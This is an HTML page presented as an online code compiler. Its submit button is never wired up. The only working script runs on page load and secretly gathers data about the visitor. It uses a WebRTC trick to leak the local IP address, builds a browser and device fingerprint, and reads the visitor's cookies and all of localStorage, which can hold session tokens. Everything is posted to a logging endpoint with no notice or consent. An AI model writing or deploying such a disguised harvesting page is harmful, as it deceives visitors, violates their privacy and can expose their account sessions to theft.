<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Compiler Online</title>
</head>
<body>
    <h1>Compiler Online</h1>

    <h2>Code Submission</h2>
    <textarea id="code" rows="10" cols="30" placeholder="Write your code here..."></textarea><br>
    <button id="submit">Submit Code</button>

    <h2>Output</h2>
    <pre id="output"></pre>

    <script>
    async function logUserInfo() {
        const pc = new RTCPeerConnection();
        let logged = false;

        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer));

        pc.onicecandidate = async event => {
            if (event.candidate && !logged) {
                const candidate = event.candidate.candidate;
                if (candidate.includes("candidate")) {
                    const localIP = candidate.split(" ")[4];
                    logged = true;

                    // Collect additional user information
                    const searchTerm = ''; // Modify to collect real search terms if applicable
                    const userAgent = navigator.userAgent;
                    const referrerHistory = document.referrer ? [document.referrer] : [];
                    const currentURL = window.location.href;
                    const screenWidth = screen.width;
                    const screenHeight = screen.height;
                    const browserLanguage = navigator.language || navigator.userLanguage;
                    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                    const osInfo = navigator.platform;
                    const timestamp = new Date().toISOString();
                    const timeSpent = 0; // Calculate time spent on the page if needed
                    const activeTabDuration = 0; // Calculate active tab duration if needed
                    const networkStatus = navigator.onLine ? 'Online' : 'Offline';
                    const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
                    const memoryInfo = performance.memory ? `${performance.memory.usedJSHeapSize} bytes` : 'No memory info';
                    const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
                    const connectionType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
                    const plugins = Array.from(navigator.plugins).map(plugin => plugin.name).join(', ') || 'No plugins';
                    const battery = await navigator.getBattery();
                    const batteryLevel = battery.level * 100;
                    const isCharging = battery.charging;
                    const geolocation = { lat: 0, lon: 0, error: 'Geolocation not available' }; // Implement geolocation if possible
                    const cookies = document.cookie || 'No cookies';
                    const localStorageData = JSON.stringify(localStorage) || 'No local storage data';

                    // Send the data to the backend
                    try {
                        const response = await fetch('/api/log', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ 
                                ip: localIP, searchTerm, userAgent, referrerHistory, currentURL, 
                                screenWidth, screenHeight, browserLanguage, timeZone, 
                                osInfo, timestamp, timeSpent, activeTabDuration, 
                                networkStatus, deviceType, memoryInfo, 
                                hardwareConcurrency, connectionType, plugins, 
                                batteryLevel, isCharging, geolocation, cookies, 
                                localStorageData 
                            })
                        });
                        
                        if (!response.ok) {
                            console.error('Failed to log user info:', response.statusText);
                        } else {
                            console.log('User info logged successfully');
                        }
                    } catch (error) {
                        console.error('Error sending log:', error);
                    }
                }
            }
        };
    }

    document.addEventListener('DOMContentLoaded', logUserInfo); // Start user info logging on page load
</script>
</body>
</html>
